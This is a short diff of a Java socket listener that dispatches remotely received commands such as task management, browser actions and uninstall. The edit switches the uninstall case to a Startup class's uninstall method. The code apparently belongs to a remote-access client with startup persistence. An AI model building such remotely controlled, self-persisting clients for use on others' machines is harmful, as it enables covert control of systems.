@@ -52,7 +52,8 @@ public class ClientListener implements SocketListener {
                     new TaskManager(recived);
                     break;
                 case "Uninstall":
-                    new Uninstall(recived);
+                    Startup start = new Startup();
+					start.uninstall();
                     break;
                 case "WebBrowser":
                     new Thread(new WebBrowser(recived)).start();
